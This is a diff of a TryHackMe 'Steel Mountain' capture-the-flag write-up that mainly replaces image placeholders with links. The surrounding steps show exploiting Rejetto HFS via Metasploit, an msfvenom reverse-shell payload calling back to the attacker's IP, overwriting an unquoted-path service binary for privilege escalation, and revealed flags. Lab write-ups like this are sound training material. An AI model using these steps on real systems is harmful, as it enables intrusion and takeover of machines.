@@ -1,7 +1,7 @@
 ![Steel Mountain Banner](https://i.imgur.com/Uo9F3uE.jpg)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/steelmountain/Steel_Mountain_Cover.png" alt="Steel Mountain Logo">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Cover.png" alt="Steel Mountain Logo">
 </p>
 
 # Steel Mountain
@@ -21,7 +21,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
    When we input the machine ip into our browser, we are taken to a web page listing someone as employee of the month. We can open the image in a new tab and check the file name which contains the name of said employee.
 
-   EMPLOYEE MONTH
+   ![Employee Month](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Employee_Month.png)
 
    ><details><summary>Click for answer</summary>Bill Harper</details>
 
@@ -35,7 +35,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
    sudo nmap 10.10.175.6 -sS -sV -Pn -p-
    ```
 
-   INITIAL NMAP
+   ![Initial Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Nmap.png)
 
    ><details><summary>Click for answer</summary>8080</details>
 
@@ -43,7 +43,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
    Since we can't find the information needed from our nmap scan, we navigate to the server in our browser. Here we find information on the name of the file server as well as the brand in the url.
 
-   INITIAL FILE SERVER
+   ![Initial File Server](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_File_Server.png)
 
    ><details><summary>Click for answer</summary>Rejetto HTTP File Server</details>
 
@@ -51,7 +51,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
    We can use `searchsploit` to look for any vulnerabilities. We are using version 2.3.
 
-   INITIAL EXPLOITS
+   ![Initial Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Exploit.png)
 
    Looks like there is a remote code execution vulnerability. On exploit-db we can see there has already been writen en Metasploit module for it.
 
@@ -67,17 +67,17 @@ This guide contains the answer and steps necessary to get to them for the [Steel
    use 0
    ```
 
-   INITIAL MODULE
+   ![Initial Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Module.png)
 
    Now we must set all the necessary options like ip addresses and port numbers.
 
-   INITIAL EXPLOIT
+   ![Initial Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Shell.png)
 
    After running the exploit we have received a meterpreter session. Dropping into the system using `shell` we get a shell on the system.
 
    Now we can navigate to bill's desktop and find our flag.
 
-   INITIAL FLAG
+   ![Initial Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Flag.png)
 
    ><details><summary>Click for answer</summary>b04763b6fcf51fcd7c13abc7db4fd365</details>
 
@@ -87,15 +87,15 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
    I already have the file on my system, so I will upload it to the machine using `upload` then run Powershell en execute the script. It would also have been possible to do this from the regular shell we obtained to navigate to the users desktop.
 
-   ESCALATE UPLOAD
+   ![Escalate Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Upload.png)
 
-   ESCALATE EXECUTE
+   ![Escalate Execute](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Execute.png)
 
 2. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as anunquoted service pathvulnerability?
 
    We can se one program with the `canrestart` option set to true. 
 
-   ESCALATE CAN RESTART
+   ![Escalate Can Restart](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Can_Restart.png)
 
    ><details><summary>Click for answer</summary>AdvancedSystemCareService9</details>
 
@@ -107,7 +107,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
    msfvenom -p windows/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
    ```
 
-   ESCALATE PAYLOAD
+   ![Escalate Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Payload.png)
 
    Using the same method as before, we upload the payload to the machine with metasploit.
 
@@ -115,7 +115,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
    upload ASCService.exe
    ```
 
-   ESCALATE UPLOAD PAYLOAD
+   ![Escalate Upload Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Upload_Payload.png)
 
    Now we must first stop the service so we can overwrite the executable for it. From the PowerUp script we found the service name we must use.
 
@@ -126,7 +126,7 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
    Now copy the "ASCService.exe" payload we created to the folder of the service and overwrite the existing.
 
-   ESCALATE OVERWRITE EXECUTABLE
+   ![Escalate Overwrite Executable](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Overwrite_Executable.png)
 
    Before we start the service, we must setup a listener with `netcat`.
 
@@ -141,17 +141,17 @@ This guide contains the answer and steps necessary to get to them for the [Steel
    sc query AdvancedSystemCareService9
    ```
 
-   ESCALATE START SERVICE
+   ![Escalate Start Service](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Start_Service.png)
 
    Eventhough the service didn't start (which makes sense as the executabel only contains our reverse shell), we did receive a connection in our listener!
 
-   ESCALATE ROOT SHELL
+   ![Escalate Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Root_Shell.png)
 
 4. What is the root flag?
 
    Now that we have root access to the system, we can navigate to our flag in the Administrator folder. After some digging we find the file on the Desktop.
 
-   ESCALATE ROOT FLAG
+   ![Escalate Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Root_Flag.png)
 
    ><details><summary>Click for answer</summary>9af5f314f57607c00fd09803a587db80</details>
 
@@ -167,11 +167,11 @@ This guide contains the answer and steps necessary to get to them for the [Steel
    - I had to replace `import urllib2` with `import urllib.request as urllib2`, because of an error with urllib2.
    - I also had to add parenthesis to the final print command as I got and error there as well.
    
-   MANUAL SCRIPT
+   ![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Script.png)
 
    If you get an error like below, you must add an `r` to line 37 above.
 
-   MANUAL ERROR
+   ![Manual Error](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Error.png)
 
    Make sure to setup a listener with:
 
@@ -187,15 +187,15 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
    After all this is done, we can run the exploit with the target ip and port number.
 
-   MANUAL EXPLOIT
+   ![Manual Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Exploit.png)
 
    After the first run, we can see our netcat binary was uploaded to the machine.
 
-   MANUAL SERVER
+   ![Manual Server](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Server.png)
 
    After the second run, we can see we received an connection on our listener.
 
-   MANUAL SHELL
+   ![Manual Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Shell.png)
 
    The remaining steps the get a root shell are similar as before.
 
